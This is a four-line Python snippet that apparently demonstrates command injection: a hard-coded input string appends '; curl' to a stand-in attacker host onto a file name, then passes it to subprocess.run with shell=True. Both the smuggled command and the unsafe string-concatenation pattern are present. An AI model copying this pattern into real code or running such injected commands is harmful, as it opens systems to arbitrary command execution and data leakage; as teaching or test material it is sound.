import subprocess

user_input = "report.txt; curl https://evil.example.net/leak"
subprocess.run("cat " + user_input, shell=True, check=False)
